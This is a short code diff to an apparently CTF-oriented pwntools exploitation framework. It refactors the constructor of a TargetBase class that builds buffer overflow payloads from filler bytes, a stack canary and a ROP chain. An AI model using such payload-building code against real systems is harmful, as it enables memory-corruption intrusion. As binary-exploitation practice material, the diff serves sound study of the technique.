@@ -1,11 +1,10 @@
-import tempfile
 import typing
 
 from pwn import ELF, ROP, remote, process
 from pwnlib.context import context
 from loguru import logger
 
-from core.libc_finder import LocalLibcFinder
+from core.generic_pwn import GenericPwn
 from core.target_config import Config, Mode
 from abstract.pwntarget import PwnTarget
 from pwn import p64
@@ -21,7 +20,7 @@ class TargetBase:
             logger.critical(f"Unknown mode selected")
             exit(0)
 
-    def __init__(self, pwn_target: typing.Type[PwnTarget], config: Config):
+    def __init__(self, config: Config, pwn_target: typing.Type[PwnTarget] = GenericPwn):
         context.log_level = 'error'
         logger.info('Parsing command line arguments:')
         if config.mode == Mode.remote:
@@ -33,6 +32,7 @@ class TargetBase:
         else:
             logger.critical(f"Unknown mode selected")
             exit(0)
+        self._gdb = None
         self._config = config
         self.file = ELF(config.file)
         self.leave = False
@@ -63,6 +63,7 @@ class TargetBase:
         result = self.filler + (p64(self.canary) if self.canary else b'') + (b'BBBBBBBB' if self.leave else b'') + rop_chain
         self.check_payload(result)
         return result
+
     @property
     def filler(self):
         return b'A' * self.offset
